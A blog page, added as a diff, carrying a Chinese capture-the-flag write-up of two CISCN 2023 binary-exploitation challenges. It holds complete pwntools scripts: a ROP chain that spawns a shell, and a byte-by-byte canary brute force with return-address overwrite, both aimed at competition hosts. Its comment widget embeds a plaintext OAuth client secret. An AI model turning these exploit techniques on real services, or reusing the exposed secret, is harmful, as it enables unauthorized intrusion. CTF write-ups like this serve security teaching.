@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    ciscn2023 pwn 宝宝题解 丨
+    
+
+    Whirling-In-Rags
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Whirling-In-Rags" type="application/atom+xml">
+</head>
+
+  <body>
+    <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">Whirling-In-Rags</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/tags">tags</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+      
+            <main class="main">
+              <article class="post">
+  
+  <div class="post-title">ciscn2023 pwn 宝宝题解</div>
+  <div class="post-meta">
+    <div class="date">2023 五月 29日</div>
+    <div class="tags">
+      
+      <a class="tag-item" href="/tags/pwn" style="color: #d1d5da;">pwn</a>
+      
+      <a class="tag-item" href="/tags/wp" style="color: #d1d5da;">wp</a>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><blockquote>
+<p>坐牢了，只会做baby题</p>
+</blockquote>
+<h1 id="shaokao"><a href="#shaokao" class="headerlink" title="shaokao"></a>shaokao</h1><p>整型下溢，然后有个栈溢出，直接用ROPgadget生成ropchain</p>
+<p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173718539.png" alt="image-20230528173718539"></p>
+<pre><code class="python">#!/usr/bin/env python2
+from pwn import*
+
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;)
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b main\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+host = &quot;123.56.251.120&quot;
+port = 36293
+#pl = process(&quot;./shaokao&quot;)
+pl = remote(host,  port)
+
+# debug()
+pl.recvuntil(&quot;&gt; &quot;)
+pl.sendline(&quot;1&quot;)
+pl.recv()
+pl.sendline(&quot;1&quot;)
+pl.recv()
+pl.sendline(&quot;-1145144&quot;)
+pl.recvuntil(&quot;&gt; &quot;)
+pl.sendline(&quot;4&quot;)
+pl.recvuntil(&quot;&gt; &quot;)
+pl.sendline(&quot;5&quot;)
+pl.recv()
+
+
+p = b&quot;a&quot;*40
+
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e0) # @ .data
+p += p64(0x0000000000458827) # pop rax ; ret
+p += b&#39;/bin//sh&#39;
+p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x0000000000447339) # xor rax, rax ; ret
+p += p64(0x000000000045af95) # mov qword ptr [rsi], rax ; ret
+p += p64(0x000000000040264f) # pop rdi ; ret
+p += p64(0x00000000004e60e0) # @ .data
+p += p64(0x000000000040a67e) # pop rsi ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x00000000004a404b) # pop rdx ; pop rbx ; ret
+p += p64(0x00000000004e60e8) # @ .data + 8
+p += p64(0x4141414141414141) # padding
+p += p64(0x0000000000447339) # xor rax, rax ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000496710) # add rax, 1 ; ret
+p += p64(0x0000000000402404) # syscall
+pl.sendline(p)
+
+
+pl.interactive()
+</code></pre>
+<h1 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h1><p>fork子进程崩溃不改变canary,利用该性质逐字节爆破canary,发现后门函数，直接覆盖前两位地址，第三位直接猜</p>
+<p><img src="/../img/ciscn2023pwn%E5%AE%9D%E5%AE%9D%E9%A2%98%E8%A7%A3.assets/image-20230528173814568.png" alt="image-20230528173814568"></p>
+<pre><code class="python">#!/usr/bin/env python2
+from pwn import*
+
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;)
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b main\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+host = &quot;123.57.248.214&quot;
+port = 25775
+#pt = process(&quot;./funcanary&quot;)
+pt = remote(host, port)
+
+pt.recvuntil(&quot;welcome\n&quot;)
+canary = &#39;\x00&#39;
+for k in range(7):
+    for i in range(256):
+        print &quot;the &quot; + str(k) + &quot;: &quot; + chr(i)
+        pt.send(&#39;a&#39;*(0x70-8) + canary + chr(i))
+        a = pt.recvuntil(&quot;welcome\n&quot;)
+        print a
+        if &quot;fun&quot; in a:
+                canary += chr(i)
+                print &quot;canary: &quot; + canary
+                break
+print &quot;canary: &quot; + canary
+
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x02&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x12&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x22&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x32&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x42&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x52&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x62&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x72&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x82&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\x92&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xa2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xb2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xc2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xd2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xe2&#39;
+pt.send(pyload)
+pyload = &#39;a&#39;*(0x70-8) + canary 
+pyload += &#39;b&#39;*8 + &#39;\x28\xf2&#39;
+pt.send(pyload)
+
+
+pt.interactive()
+</code></pre>
+</main>
+
+  
+    <div id="gitalk-container"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+	var gitalk = new Gitalk({
+  	clientID: 'Ov23liOeINaDo82m26KW',
+  	clientSecret: '40d0c404806ec19c706fad7b692aba1c3a281818',
+  	repo: 'DeePunk42.github.io',
+  	owner: 'DeePunk42',
+  	admin: ['DeePunk42'],
+  	id: 'Mon May 29 2023 23:26:54 GMT+0800',
+  	distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+    
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+            </main>
+            
+              <footer class="footer">
+  
+  <span>Copyright © 2021 DeePunk</span>
+  
+</footer>
+                
+<script src="/js/theme.js"></script>
+
+  </body>
+
+</html>
